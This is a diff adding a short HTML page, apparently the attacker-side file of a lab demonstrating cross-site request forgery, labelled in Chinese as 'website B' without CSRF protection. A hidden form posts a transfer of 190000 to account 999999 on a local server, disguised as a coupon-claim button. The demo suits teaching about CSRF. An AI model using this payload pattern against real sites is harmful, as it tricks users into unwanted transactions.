@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<h1>我是网站B</h1>
+<h2>未设置CSRF</h2>
+
+<form method="post" action="http://0.0.0.0:8000/transfer">
+    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+    <input type="hidden" name="to_account" value="999999">
+    <input type="hidden" name="money" value="190000" hidden>
+    <input type="submit" value="点击领取优惠券">
+</form>
+
+</body>
+</html>
